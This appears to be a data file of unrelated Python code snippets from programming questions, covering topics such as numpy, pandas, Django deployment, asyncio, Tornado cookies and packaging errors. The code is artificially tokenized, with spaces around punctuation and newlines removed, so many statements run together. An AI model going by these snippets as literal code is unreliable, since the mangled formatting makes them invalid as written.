) 123 16 class IndexPageHandler ( BaseClass , RequestHandler ) : @ gen.coroutine def get ( self ) : print ( 'cookie ' , self.get_secure_cookie ( 'user ' ) ) user_async = yield self.get_current_user_async ( ) print ( 'user_async ' , user_async ) print ( 'current user ' , self.current_user ) self.render ( `` index.html '' , ) cookie b'cfae7a25-2b8b-46a6-b5c4-0083a114c40e'123 user_async b'cfae7a25-2b8b-46a6-b5c4-0083a114c40e'current user None"
"arr = np.array ( [ 0.0 , 0.0 ] , [ 0.5 , 0.0 ] , [ 1.0 , 0.0 ] , [ 0.0 , 0.5 ] , [ 0.5 , 0.5 ] , [ 1.0 , 0.5 ] , [ 0.0 , 1.0 ] , [ 0.5 , 1.0 ] , [ 1.0 , 1.0 ] ) arr2 = np.array ( [ 0.5 , 0.0 ] , [ 0.0 , 0.0 ] , [ 0.0 , 0.5 ] , [ 1.0 , 0.0 ] , [ 0.5 , 0.5 ] , [ 1.0 , 0.5 ] , [ 0.0 , 1.0 ] , [ 1.0 , 1.0 ] , [ 0.5 , 1.0 ] ) where_things_are ( arr2 , arr ) return : array ( [ 1 , 0 , 3 , 2 , 4 , 5 , 6 , 8 , 7 ] ) np.array ( [ np.where ( ( arr == x ) .all ( axis=1 ) ) for x in arr2 ] )"
"def visualize_trajectory ( self , trajectory= [ [ 0,0,0,0 ] , [ 0.1,0.1,0,0 ] ] ) : domain_fig = plt.figure ( ) for i , s in enumerate ( trajectory ) : x , y , speed , heading = s [ :4 ] car_xmin = x - self.REAR_WHEEL_RELATIVE_LOC car_ymin = y - self.CAR_WIDTH / 2. car_fig = matplotlib.patches.Rectangle ( [ car_xmin , car_ymin ] , self.CAR_LENGTH , self.CAR_WIDTH , alpha= ( 0.8 * i ) / len ( trajectory ) ) rotation = Affine2D ( ) .rotate_deg_around ( x , y , heading * 180 / np.pi ) + plt.gca ( ) .transData car_fig.set_transform ( rotation ) plt.gca ( ) .add_patch ( car_fig )"
"src/ python/ gui/ __main__.py if __name__ == `` __main__ '' : # Redirect py2exe log to somewhere else if windows if hasattr ( sys , '' frozen '' ) and sys.frozen in ( `` windows_exe '' , `` console_exe '' ) : stdout_file = `` c : \ProgramData\AppName\out.log '' stderr_file = `` c : \ProgramData\AppName\err.log '' sys.stdout = open ( stdout_file , `` w '' ) sys.stderr = open ( stderr_file , `` w '' ) try : gui = AppNameGui ( ) gui.main ( ) except : traceback.print_exc ( )"
"def cumulative_ols ( data_frame , lhs_column , rhs_column , date_column , min_obs=60 ) : beta_dict = { } for dt in data_frame [ date_column ] .unique ( ) : cur_df = data_frame [ data_frame [ date_column ] < = dt ] obs_count = cur_df [ lhs_column ] .notnull ( ) .sum ( ) if min_obs < = obs_count : beta = pandas.ols ( y=cur_df [ lhs_column ] , x=cur_df [ rhs_column ] , ) .beta.ix [ ' x ' ] # # # else : beta = np.NaN # # # beta_dict [ dt ] = beta # # # beta_df = pandas.DataFrame ( pandas.Series ( beta_dict , name= '' FactorBeta '' ) ) beta_df.index.name = date_column return beta_df"
"class BooleanLiteral ( Keyword ) : grammar = Enum ( K ( `` OR '' ) , K ( `` AND '' ) ) class LineFilter ( Namespace ) : grammar = flag ( 'inverted ' , `` - '' ) , name ( ) , `` : '' , attr ( 'value ' , word ) class LineExpression ( List ) : grammar = csl ( LineFilter , separator=blank )"
# When a connection is made # Send an email # Send a text message # Send notification to server output # Etc ...
"import numpy as np x=np.random.random ( 1000000 ) for i in range ( 100000 ) : np.sqrt ( x ) import numpy as npimport pandas as pddf=pd.DataFrame ( np.random.random ( ( 10,10 ) ) ) df+dfx=np.random.random ( 1000000 ) for i in range ( 100000 ) : np.sqrt ( x )"
"container_commands : 01_migrate : command : `` source /opt/python/run/venv/bin/activate & & python manage.py migrate -- noinput '' leader_only : trueoption_settings : `` aws : elasticbeanstalk : application : environment '' : DJANGO_SETTINGS_MODULE : `` mysite.settings '' `` PYTHONPATH '' : `` /opt/python/current/app/mysite : $ PYTHONPATH '' `` ALLOWED_HOSTS '' : `` .elasticbeanstalk.com '' `` aws : elasticbeanstalk : container : python '' : WSGIPath : mysite/wsgi.py NumProcesses : 3 NumThreads : 20 `` aws : elasticbeanstalk : container : python : staticfiles '' : `` /static/ '' : `` www/static/ '' DATABASES = { 'default ' : { 'ENGINE ' : 'django.db.backends.mysql ' , 'NAME ' : os.environ [ 'RDS_DB_NAME ' ] , 'USER ' : os.environ [ 'RDS_USERNAME ' ] , 'PASSWORD ' : os.environ [ 'RDS_PASSWORD ' ] , 'HOST ' : os.environ [ 'RDS_HOSTNAME ' ] , 'PORT ' : os.environ [ 'RDS_PORT ' ] , } }"
"df=pd.read_csv ( 'Data 3.csv ' , parse_dates= [ `` Dates '' ] , index_col= '' Dates '' ) # create the plot space upon which to plot the datafig , ax = plt.subplots ( figsize = ( 10,10 ) ) # add the x-axis and the y-axis to the plotax.plot ( df.resample ( ' Y ' ) .sum ( ) [ 'Total # Events ' ] , color = 'blue ' ) # rotate tick labelsplt.setp ( ax.get_xticklabels ( ) , rotation=45 ) # set title and labels for axesax.set ( xlabel= '' Years '' , ylabel= '' Total # of Events '' , title= '' Yearly Treatment Events from 2010-2017 '' ) ;"
"username machine start end1 user1 D5599.domain.com 2011-01-03 09:44:18 2011-01-03 09:47:272 user1 D5599.domain.com 2011-01-03 09:46:29 2011-01-03 10:09:163 user1 D5599.domain.com 2011-01-03 14:07:36 2011-01-03 14:56:174 user1 D5599.domain.com 2011-01-05 15:03:17 2011-01-05 15:23:155 user1 D5599.domain.com 2011-02-14 14:33:39 2011-02-14 14:40:166 user1 D5599.domain.com 2011-02-23 13:54:30 2011-02-23 13:58:237 user1 D5599.domain.com 2011-03-21 10:10:18 2011-03-21 10:32:228 user1 D5645.domain.com 2011-06-09 10:12:41 2011-06-09 10:58:599 user1 D5682.domain.com 2011-01-03 12:03:45 2011-01-03 12:29:4310 USER2 D5682.domain.com 2011-01-12 14:26:05 2011-01-12 14:32:5311 USER2 D5682.domain.com 2011-01-17 15:06:19 2011-01-17 15:44:2212 USER2 D5682.domain.com 2011-01-18 15:07:30 2011-01-18 15:42:4313 USER2 D5682.domain.com 2011-01-25 15:20:55 2011-01-25 15:24:3814 USER2 D5682.domain.com 2011-02-14 15:03:00 2011-02-14 15:07:4315 USER2 D5682.domain.com 2011-02-14 14:59:23 2011-02-14 15:14:47 > username machine start end1 user1 D5599.domain.com 2011-01-03 09:44:18 2011-01-03 09:47:273 user1 D5599.domain.com 2011-01-03 14:07:36 2011-01-03 14:56:174 user1 D5599.domain.com 2011-01-05 15:03:17 2011-01-05 15:23:155 user1 D5599.domain.com 2011-02-14 14:33:39 2011-02-14 14:40:166 user1 D5599.domain.com 2011-02-23 13:54:30 2011-02-23 13:58:237 user1 D5599.domain.com 2011-03-21 10:10:18 2011-03-21 10:32:228 user1 D5645.domain.com 2011-06-09 10:12:41 2011-06-09 10:58:599 user1 D5682.domain.com 2011-01-03 12:03:45 2011-01-03 12:29:4310 USER2 D5682.domain.com 2011-01-12 14:26:05 2011-01-12 14:32:5311 USER2 D5682.domain.com 2011-01-17 15:06:19 2011-01-17 15:44:2212 USER2 D5682.domain.com 2011-01-18 15:07:30 2011-01-18 15:42:4313 USER2 D5682.domain.com 2011-01-25 15:20:55 2011-01-25 15:24:3814 USER2 D5682.domain.com 2011-02-14 15:03:00 2011-02-14 15:07:43 > structure ( list ( username = c ( `` user1 '' , `` user1 '' , `` user1 '' , '' user1 '' , `` user1 '' , `` user1 '' , `` user1 '' , `` user1 '' , '' user1 '' , `` USER2 '' , `` USER2 '' , `` USER2 '' , `` USER2 '' , `` USER2 '' , `` USER2 '' ) , machine = structure ( c ( 1L , 1L , 1L , 1L , 1L , 1L , 1L , 2L , 3L,3L , 3L , 3L , 3L , 3L , 3L ) , .Label = c ( `` D5599.domain.com '' , `` D5645.domain.com '' , '' D5682.domain.com '' , `` D5686.domain.com '' , `` D5694.domain.com '' , `` D5696.domain.com '' , '' D5772.domain.com '' , `` D5772.domain.com '' , `` D5847.domain.com '' , `` D5855.domain.com '' , '' D5871.domain.com '' , `` D5927.domain.com '' , `` D5927.domain.com '' , `` D5952.domain.com '' , '' D5993.domain.com '' , `` D6012.domain.com '' , `` D6048.domain.com '' , `` D6077.domain.com '' , '' D5688.domain.com '' , `` D5815.domain.com '' , `` D6106.domain.com '' , `` D6128.domain.com '' ) , class = `` factor '' ) , start = structure ( c ( 1294040658 , 1294040789,1294056456 , 1294232597 , 1297686819 , 1298462070 , 1300695018 , 1307603561,1294049025 , 1294835165 , 1295269579 , 1295356050 , 1295961655 , 1297688580,1297688363 ) , class = c ( `` POSIXct '' , `` POSIXt '' ) , tzone = `` '' ) , end =structure ( c ( 1294040847,1294042156 , 1294059377 , 1294233795 , 1297687216 , 1298462303 , 1300696342,1307606339 , 1294050583 , 1294835573 , 1295271862 , 1295358163 , 1295961878,1297688863 , 1297689287 ) , class = c ( `` POSIXct '' , `` POSIXt '' ) , tzone = `` '' ) ) , .Names = c ( `` username '' , '' machine '' , `` start '' , `` end '' ) , row.names = c ( NA , 15L ) , class = `` data.frame '' )"
import astprint ( ast.literal_eval ( ' 5 + 7 ' ) ) # - > 12print ( ast.literal_eval ( ' 5 * 7 ' ) ) # - > Traceback ( most recent call last ) : ... ValueError : malformed node or string : < _ast.BinOp object at ... >
"> > > import os > > > os.path.join ( ' a ' , ' b ' ) ' a/b ' > > > os.path.join ( ' a ' , '/b ' ) '/b ' > > > os.path.join ( ' a/ ' , ' b ' ) ' a/b '"
"> > > t = numpy.array ( range ( 81 ) ) .reshape ( ( 9,9 ) ) > > > tarray ( [ [ 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] , [ 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 ] , [ 18 , 19 , 20 , 21 , 22 , 23 , 24 , 25 , 26 ] , [ 27 , 28 , 29 , 30 , 31 , 32 , 33 , 34 , 35 ] , [ 36 , 37 , 38 , 39 , 40 , 41 , 42 , 43 , 44 ] , [ 45 , 46 , 47 , 48 , 49 , 50 , 51 , 52 , 53 ] , [ 54 , 55 , 56 , 57 , 58 , 59 , 60 , 61 , 62 ] , [ 63 , 64 , 65 , 66 , 67 , 68 , 69 , 70 , 71 ] , [ 72 , 73 , 74 , 75 , 76 , 77 , 78 , 79 , 80 ] ] ) > > > t [ 2,3 ] 21 > > > t.shape ( 9 , 9 ) > > > t.strides ( 72 , 8 ) array ( [ [ 3 , 4 , 5 ] , [ 12 , 13 , 14 ] , [ 21 , 22 , 23 ] ] )"
".gcloudignore # If you would like to upload your .git directory , .gitignore file or # files from your .gitignore file , remove the corresponding line below : .git .gitignore # ! include : .gitignore"
"[ ( 1 , u'first_type ' , u'data_gid_1 ' ) , ( 2 , u'first_type ' , u'data_gid_2 ' ) , ( 3 , u'first_type ' , u'data_gid_3 ' ) , ( 4 , u'first_type ' , u'data_gid_4 ' ) ] > > > ids = [ dat [ 0 ] for dat in all_data ] > > > gds = [ dat [ 2 ] for dat in all_data ] ( ids , gds ) = [ ( dat [ 0 ] , dat [ 2 ] ) for dat in all_data ]"
def foo ( x=5 ) : if x == 0 : return 1 else : return 2*foo ( x-1 ) print ( foo ( 3 ) )
"$ python manage.py shellPython 2.7.5 ( default , Sep 6 2013 , 09:55:21 ) Type `` copyright '' , `` credits '' or `` license '' for more information.IPython 1.1.0 -- An enhanced Interactive Python. ? - > Introduction and overview of IPython 's features. % quickref - > Quick reference.help - > Python 's own help system.object ? - > Details about 'object ' , use 'object ? ? ' for extra details.In [ 1 ] : from re import searchIn [ 2 ] : def my_search ( pattern , string ) : return search ( pattern , string ) ... : In [ 3 ] : my_search ( ' x ' , ' y ' ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -NameError Traceback ( most recent call last ) /home/wilfred/.envs/drawbridge/lib/python2.7/site-packages/django/core/management/commands/shell.pyc in < module > ( ) -- -- > 1 my_search ( ' x ' , ' y ' ) /home/wilfred/.envs/drawbridge/lib/python2.7/site-packages/django/core/management/commands/shell.pyc in my_search ( pattern , string ) 1 def my_search ( pattern , string ) : -- -- > 2 return search ( pattern , string ) 3 NameError : global name 'search ' is not defined"
c++ : pyamg/amg_core/amg_core_wrap.cxxclang : error : no such file or directory : ' “ -I/Users/mas/PycharmProjects/kaggle-ndsb/boost_1_59_0 ” 'clang : error : no such file or directory : ' “ -I/Users/mas/PycharmProjects/kaggle-ndsb/boost_1_59_0 ” 'error : Command `` c++ -fno-strict-aliasing -fno-common -dynamic -arch x86_64 -arch i386 -g -Os -pipe -fno-common -fno-strict-aliasing -fwrapv -DENABLE_DTRACE -DMACOSX -DNDEBUG -Wall -Wshorten-64-to-32 -DNDEBUG -g -fwrapv -Os -Wall -Wstrict-prototypes -DENABLE_DTRACE “ -I/Users/mas/PycharmProjects/kaggle-ndsb/boost_1_59_0 ” -arch x86_64 -arch i386 -pipe -D__STDC_FORMAT_MACROS=1 -I/Users/mas/PycharmProjects/Whale/Zahraa5/lib/python2.7/site-packages/numpy/core/include -I/System/Library/Frameworks/Python.framework/Versions/2.7/include/python2.7 -c pyamg/amg_core/amg_core_wrap.cxx -o build/temp.macosx-10.10-intel-2.7/pyamg/amg_core/amg_core_wrap.o '' failed with exit status 1
perl -pe ' ... command ... '
"> > > from lark import Lark > > > parser = Lark ( 'operator : `` < `` | `` > '' | `` = '' | `` > = '' | `` < = '' | `` ! = '' ' , start= '' operator '' ) > > > parsed = parser.parse ( `` > '' ) > > > parsedTree ( operator , [ ] ) > > > parsed.data'operator ' > > > parsed.valueTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'Tree ' object has no attribute 'value '"
"INCIDENT_DATE12/31/2006 11:20:00 PM12/31/2006 11:30:00 PM01/01/2007 00:2501/01/2007 00:1012/31/2006 11:30:00 AM01/01/2007 00:0501/01/2007 00:0112/31/2006 4:45:00 PM12/31/2006 11:50:00 PM**01/01/2007** 2006-12-31 23:20:002006-12-31 23:30:002007-01-01 00:25:002007-01-01 00:10:002006-12-31 11:30:002007-01-01 00:05:002007-01-01 00:01:002006-12-31 16:45:002006-12-31 23:50:00**2007-01-01 00:00:00** # # Format datetime columncrimeall [ 'INCIDENT_DATE ' ] = pd.DatetimeIndex ( crimeall [ 'INCIDENT_DATE ' ] ) # # Split DateTime columncrimeall [ 'TIME ' ] , crimeall [ 'DATE ' ] = crimeall [ 'INCIDENT_DATE ' ] .apply ( lambda x : x.time ( ) ) , crimeall [ 'INCIDENT_DATE ' ] .apply ( lambda x : x.date ( ) ) 2006-12-31 23:20:002006-12-31 23:30:002007-01-01 00:25:002007-01-01 00:10:002006-12-31 11:30:002007-01-01 00:05:002007-01-01 00:01:002006-12-31 16:45:002006-12-31 23:50:00**2007-01-01 NaN**"
import threadingimport timedef a ( ) : while True : time.sleep ( 1 ) print ( ' a ' ) def b ( ) : while True : time.sleep ( 2 ) print ( ' b ' ) threading.Thread ( target=a ) .start ( ) threading.Thread ( target=b ) .start ( ) while True : time.sleep ( 3 ) print ( ' c ' ) import asyncioimport timeasync def a ( ) : while True : await asyncio.sleep ( 1 ) print ( ' a ' ) async def b ( ) : while True : await asyncio.sleep ( 2 ) print ( ' b ' ) async def mainloop ( ) : await a ( ) await b ( ) loop = asyncio.get_event_loop ( ) loop.run_until_complete ( mainloop ( ) ) loop.close ( )
"> > > date = datetime.date ( 1991 , 10 , 12 ) > > > f ' { date } was on a { date : % A } ''1991-10-12 was on a Saturday ' class MyDatetime : def __init__ ( self , my_datetime , some_other_value ) : self.dt = my_datetime self.some_other_value = some_other_value def __fstr__ ( self , format_str ) : return ( self.dt.strftime ( format_str ) + 'some other string ' + str ( self.some_other_value )"
"import numpy as npimport pandas as pddf = pd.DataFrame ( np.random.random ( ( 4,4 ) ) ) df.index = pd.MultiIndex.from_product ( [ [ 1,2 ] , [ ' A ' , ' B ' ] ] ) df.index.names = [ 'RowInd1 ' , 'RowInd2 ' ] # This worksprint ( df.query ( 'RowInd2 in [ `` A '' ] ' ) ) df = pd.DataFrame ( np.random.random ( ( 4,4 ) ) ) df.columns = pd.MultiIndex.from_product ( [ [ 1,2 ] , [ ' A ' , ' B ' ] ] ) df.columns.names = [ 'ColInd1 ' , 'ColInd2 ' ] # query on index works , but not on the multiindexed columnprint ( df.query ( 'index < 2 ' ) ) print ( df.query ( 'ColInd2 in [ `` A '' ] ' ) )"
"In [ 2 ] : from matplotlib.pyplot import *In [ 3 ] : x = range ( 5 ) In [ 4 ] : y = range ( 5,10 ) In [ 5 ] : plot ( x , y ) WARNING : QApplication was not created in the main ( ) thread.Out [ 5 ] : [ < matplotlib.lines.Line2D at 0x7fade916a438 > ] In [ 6 ] : show ( ) In [ 2 ] : import matplotlib.pyplot as pltIn [ 3 ] : x = range ( 5 ) In [ 4 ] : y = range ( 5,10 ) In [ 5 ] : plt.plot ( x , y ) Out [ 5 ] : [ < matplotlib.lines.Line2D at 0x7fd3453b72e8 > ] In [ 6 ] : plt.show ( ) In [ 2 ] : from matplotlib.pyplot import *In [ 3 ] : import matplotlib.pyplot as pltIn [ 4 ] : x = range ( 5 ) In [ 5 ] : y = range ( 5,10 ) In [ 6 ] : plt.plot ( x , y ) WARNING : QApplication was not created in the main ( ) thread.Out [ 6 ] : [ < matplotlib.lines.Line2D at 0x7fade916a438 > ] In [ 7 ] : plt.show ( ) In [ 2 ] : from matplotlib.pyplot import * ... : x = range ( 5 ) ... : y = range ( 5,10 ) ... : plot ( x , y ) ... : show ( ) In [ 3 ] : plot ( x , y ) WARNING : QApplication was not created in the main ( ) thread.Out [ 3 ] : [ < matplotlib.lines.Line2D at 0x7fc68a3009e8 > ] In [ 4 ] : show ( )"
class MyClass : def __init__ ( self ) : pass def call_me ( self= '' ) : print ( self ) > > > MyClass ( ) .call_me ( ) < __main__.MyClass object at 0x000002A12E7CA908 >
def Matrix_func ( ) : `` '' '' [ 1 4 7 ] M = [ 2 5 8 ] [ 3 6 9 ] `` '' ''
# ! /usr/bin/env pythonimport sysimport unittestclass TestCase ( unittest.TestCase ) : def test ( self ) : # raise Exception ( 'Exception for testing . ' ) # self.fail ( `` Failure for testing . '' ) passdef main ( ) : suite = unittest.defaultTestLoader.loadTestsFromTestCase ( TestCase ) result = unittest.TestResult ( ) suite.run ( result ) if result.errors : # Skip the revision return 125 if result.wasSuccessful ( ) : return 0 else : return 1if '__main__ ' == __name__ : sys.exit ( main ( ) ) hg bisect -- resethg bisect -- badhg bisect -- good -r 1hg bisect -- command=bisector.py
import tensorflow as tftf.set_random_seed ( 0 ) # make sure results are reproducibleimport numpy as npnp.random.seed ( 0 ) # make sure results are reproducible 0 ; 0.001733 ; 0.001313500 ; 0.390164 ; 0.388188 0 ; 0.006986 ; 0.007000500 ; 0.375288 ; 0.374250 $ python -c `` import tensorflow ; print ( tensorflow.__version__ ) '' I tensorflow/stream_executor/dso_loader.cc:135 ] successfully opened CUDA library libcublas.so.8.0 locallyI tensorflow/stream_executor/dso_loader.cc:135 ] successfully opened CUDA library libcudnn.so.5 locallyI tensorflow/stream_executor/dso_loader.cc:135 ] successfully opened CUDA library libcufft.so.8.0 locallyI tensorflow/stream_executor/dso_loader.cc:135 ] successfully opened CUDA library libcuda.so.1 locallyI tensorflow/stream_executor/dso_loader.cc:135 ] successfully opened CUDA library libcurand.so.8.0 locally1.0.0 $ python -c `` import numpy ; print ( numpy.__version__ ) '' 1.12.0
"setup ( name='particle-fish ' , version= ' 0.1.0 ' , description='Python Boilerplate contains all the boilerplate you need to create a Python package . ' , long_description=readme + '\n\n ' + history , author='Lachlan Pease ' , author_email='predatory.kangaroo @ gmail.com ' , url='https : //github.com/predakanga/particle-fish ' , packages= [ 'particle.plugins ' ] , include_package_data=True , install_requires= [ 'particle ' , 'irccrypt ' , 'pycrypto ' ] , dependency_links= [ 'http : //www.bjrn.se/code/irccrypt/irccrypt.py # egg=irccrypt-1.0 ' ] , license= '' BSD '' , zip_safe=False , keywords='particle-fish ' , classifiers= [ 'Development Status : : 2 - Pre-Alpha ' , 'Intended Audience : : Developers ' , 'License : : OSI Approved : : BSD License ' , 'Natural Language : : English ' , `` Programming Language : : Python : : 2 '' , 'Programming Language : : Python : : 2.6 ' , 'Programming Language : : Python : : 2.7 ' , 'Programming Language : : Python : : 3 ' , 'Programming Language : : Python : : 3.3 ' , ] , test_suite='tests ' , tests_require= [ 'pytest ' , 'mock ' , 'coverage ' , 'pytest-cov ' ] , cmdclass = { 'test ' : PyTest } , ) Installed /Users/lachlan/.virtualenvs/particle-fish/lib/python2.7/site-packages/particle_fish-0.1.0-py2.7.eggProcessing dependencies for particle-fish==0.1.0Searching for irccryptBest match : irccrypt 1.0Downloading http : //www.bjrn.se/code/irccrypt/irccrypt.py # egg=irccrypt-1.0Processing irccrypt.pyWriting /var/tmp/easy_install-svPfHF/setup.cfgRunning setup.py -q bdist_egg -- dist-dir /var/tmp/easy_install-svPfHF/egg-dist-tmp-Xq3OCtzip_safe flag not set ; analyzing archive contents ... Adding irccrypt 1.0 to easy-install.pth file Downloading/unpacking irccrypt ( from particle-fish==0.1.0 ) Downloading irccrypt.py Can not unpack file /private/var/tmp/pip-mCc6La-unpack/irccrypt.py ( downloaded from /Users/lachlan/.virtualenvs/particle-staging/build/irccrypt , content-type : text/plain ) ; can not detect archive formatCleaning up ... Can not determine archive format of /Users/lachlan/.virtualenvs/particle-staging/build/irccrypt"
"# ! /usr/bin/env pythonimport requestsfrom requests.adapters import HTTPAdapterfrom requests.packages.urllib3.util.retry import Retryfrom requests.exceptions import RetryErrordef main ( ) : retry_policy = Retry ( total=3 , status_forcelist= [ 418 ] ) session = requests.Session ( ) session.mount ( 'http : // ' , HTTPAdapter ( max_retries=retry_policy ) ) try : session.get ( 'http : //httpbin.org/status/418 ' ) except RetryError as retry_error : print retry_error print retry_error.response is Noneif __name__ == '__main__ ' : main ( ) HTTPConnectionPool ( host='httpbin.org ' , port=80 ) : Max retries exceeded with url : /status/418 ( Caused by ResponseError ( 'too many 418 error responses ' , ) ) True"
"t1 = np.array ( [ 0,13,22 , ... ,99994 ] ) t2 = np.array ( [ 4,14,25 , ... ,99998 ] ) np.array ( [ 0,1,2,3,4,13,14,22,23,24,25 , ... ,99994,99995,99996,99997,99998 ] ) np.array ( [ i for a , b in zip ( t1 , t2 ) for i in range ( a , b + 1 ) ] ) import numpy as npm =10000Z = np.arange ( 0,10*m,10 ) t1 = np.random.randint ( 5 , size =m ) + Zt2 =np.random.randint ( 5 , size = m ) + 5 + Z"
"help ( tkinter.Tk.mainloop ) > > > > mainloop ( self , n=0 ) # What is n here ? Call the mainloop of Tk ."
"assignment = Table ( 'assignment ' , metadata , Column ( 'parent ' , Integer , ForeignKey ( 'node.id ' ) ) , Column ( 'child ' , Integer , ForeignKey ( 'node.id ' ) ) ) closure = Table ( 'closure ' , metadata , Column ( 'ancestor ' , Integer , ForeignKey ( 'node.id ' ) ) , Column ( 'descendent ' , Integer , ForeignKey ( 'node.id ' ) ) ) class Node ( Base ) : __tablename__ = 'node ' id = Column ( Integer , primary_key=True ) parents = relationship ( Node , secondary=assignment , backref='children ' , primaryjoin=id == assignment.c.parent , secondaryjoin=id == assignment.c.child ) ancestors = relationship ( Node , secondary=closure , backref='descendents ' , primaryjoin=id == closure.c.ancestor , secondaryjoin=id == closure.c.descendent , viewonly=True ) @ classmethod def recompute_ancestry ( cls.conn ) : conn.execute ( closure.delete ( ) ) adjacent_values = conn.execute ( assignment.select ( ) ) .fetchall ( ) conn.execute ( closure.insert ( ) , floyd_warshall ( adjacent_values ) )"
"for i , cluster in enumerate ( c ) : # code that does stuff with i and cluster"
# : kivy 1.8 < HelloWorldForm @ BoxLayout > : orientation : `` vertical '' Label : text : '' Hello world '' Button : text : `` Go back '' on_press : app.formGoBack ( ) < MainForm @ BoxLayout > : orientation : `` vertical '' btnOpenForm : btnChangeForm BoxLayout : size_hint_y : None height : '' 40dp '' Button : id : btnChangeForm text : '' Go to hello world form '' on_press : root.clear_widgets ( ) root.add_widget ( HelloWorldForm ) Button : id : btnExit text : '' Exit '' on_press : app.Exit ( ) MainForm : < MainForm @ BoxLayout > : orientation : `` vertical '' btnOpenForm : btnChangeForm BoxLayout : size_hint_y : None height : '' 40dp '' Button : id : btnChangeForm text : '' Go to hello world form '' on_press : app.changeForm ( ) # ! /usr/bin/python3.4import kivykivy.require ( ' 1.8.0 ' ) from kivy.app import Appfrom kivy.uix import *class MainApp ( App ) : def changeForm ( self ) /** TO-DO **/app=MainApp ( ) app.run ( )
"tf.map_fn ( fn , nonzeros ( Matrix , dim , row ) ) nonzeros ( Matrix , dim , row ) returns a ( index , value ) ValueError : The two structures do n't have the same number of elements . First structure : < dtype : 'int64 ' > , second structure : ( < tf.Tensor 'map_2/while/while/Exit_1:0 ' shape= ( 20 , ) dtype=float32 > , < tf.Tensor 'map_2/while/Sub:0 ' shape= ( ) dtype=int64 > ) ."
"visits = Subs.objects.filter ( camp=campdata , timestamp__lte=datetime.datetime.today ( ) , timestamp__gt=datetime.datetime.today ( ) -datetime.timedelta ( days=30 ) ) .\values ( 'timestamp ' ) .annotate ( count=Count ( 'timestamp ' ) ) for a in visits : print ( a ) { 'timestamp ' : datetime.datetime ( 2018 , 10 , 5 , 15 , 16 , 25 , 130966 , tzinfo= < UTC > ) , 'count ' : 1 } { 'timestamp ' : datetime.datetime ( 2018 , 10 , 5 , 15 , 16 , 45 , 639464 , tzinfo= < UTC > ) , 'count ' : 1 } { 'timestamp ' : datetime.datetime ( 2018 , 10 , 6 , 8 , 43 , 24 , 721050 , tzinfo= < UTC > ) , 'count ' : 1 } { 'timestamp ' : datetime.datetime ( 2018 , 10 , 7 , 4 , 54 , 59 , tzinfo= < UTC > ) , 'count ' : 1 } { 'timestamp ' : 2018-10-5 , 'count ' : 2 }"
> > > 1e16 + 1.1e+16 > > > 1e16 + 1.11.0000000000000002e+16 10000000000000000.999999 ... .
"class Producer : def generateProjectStatusChanges ( ) : ... def updateSuperAwesomeDataStructure ( changes ) : for ( proj , stat ) in changes : # queue wo n't do cause the update could take place in the middle of the queue # hence the dict behavior superAwesomeDS.putOrUpdate ( proj , stat ) def watchForUpdates ( ) : changes = generateProjectStatusChanges ( ) updateSuperAwesomeDataStructure ( changes ) time.sleep ( self.interval ) class Worker : def blockingNotifyAnimation ( ) : ... def watchForUpdates ( ) : while true : proj , stat = superAwesomeDS.getFirstPair ( ) # or any pair really blockingNotifyAnimation ( proj , stat )"
"> > > sum ( ( j for j in xrange ( 5 ) ) ) 10 > > > sum ( j for j in xrange ( 5 ) ) 10 > > > j for j in xrange ( 5 ) File `` < stdin > '' , line 1 j for j in xrange ( 5 ) ^SyntaxError : invalid syntax"
"@ propertydef nodes ( self ) : return self._nodes @ nodes.setterdef nodes ( self , nodes ) : `` '' '' set the nodes on this object. `` '' '' assert nodes ! = [ ] # without nodes no route.. self.node_names = [ node.name for node in nodes ] self._nodes = nodes W806 redefinition of function 'nodes ' from line 5"
python & fg python [ ctrl-z ] bgfg python -i simulation.py & fg # ( after it 's finished running )
"flags = argparser.parse_args ( ) credentials = run_flow ( flow , storage , flags ) from oauth2client.tools import argparser argparser.parse_args ( ) and got : usage : __main__.py [ -- auth_host_name AUTH_HOST_NAME ] [ -- noauth_local_webserver ] [ -- auth_host_port [ AUTH_HOST_PORT [ AUTH_HOST_PORT ... ] ] ] [ -- logging_level { DEBUG , INFO , WARNING , ERROR , CRITICAL } ] __main__.py : error : unrecognized arguments : -f /run/user/1000/jupyter/kernel-c9aa5199-fcea-4884-8e5f-a004c66a733e.jsonSystemExit Traceback ( most recent call last ) < ipython-input-3-d141fc7aebe0 > in < module > ( ) -- -- > 1 argparser.parse_args ( ) /usr/lib/python3.5/argparse.py in parse_args ( self , args , namespace ) 1736 if argv : 1737 msg = _ ( 'unrecognized arguments : % s ' ) - > 1738 self.error ( msg % ' '.join ( argv ) ) 1739 return args 1740 /usr/lib/python3.5/argparse.py in error ( self , message ) 2392 self.print_usage ( _sys.stderr ) 2393 args = { 'prog ' : self.prog , 'message ' : message } - > 2394 self.exit ( 2 , _ ( ' % ( prog ) s : error : % ( message ) s\n ' ) % args ) /usr/lib/python3.5/argparse.py in exit ( self , status , message ) 2379 if message : 2380 self._print_message ( message , _sys.stderr ) - > 2381 _sys.exit ( status ) 2382 2383 def error ( self , message ) : SystemExit : 2"
"class GUIclass ( Frame ) : def __init__ ( self , parent ) : frame = Frame ( self , parent ) Frame.__init__ ( self , parent ) frame = Frame.__init__ ( self , parent )"
def test ( arg1='Foo ' ) : pass
"class Foo ( object ) : _callback = None @ classmethod def Register ( cls , fn ) : cls._callback = fndef Bar ( ) : print `` Called '' Foo.Register ( Bar ) Foo._callback ( ) input clear Python 2.7.10 ( default , Jul 14 2015 , 19:46:27 ) [ GCC 4.8.2 ] on linuxTraceback ( most recent call last ) : File `` python '' , line 12 , in < module > TypeError : unbound method Bar ( ) must be called with Foo instance as first argument ( got nothing instead ) class Foo ( object ) : _callback = [ ] @ classmethod def Register ( cls , fn ) : cls._callback.append ( fn ) def Bar ( ) : print `` Called '' Foo.Register ( Bar ) Foo._callback [ 0 ] ( )"
"A = array ( [ [ 1.0*cos ( z0 ) **2 + 1.0 , 1.0*cos ( z0 ) ] , [ 1.0*cos ( z0 ) , 1.00000000000000 ] ] , dtype=object ) einsum ( 'ik , jkim , j ' , A , B , C ) TypeError : invalid data type for einsum"
"store = gtk.ListStore ( str , gtk.gdk.Pixbuf , bool )"
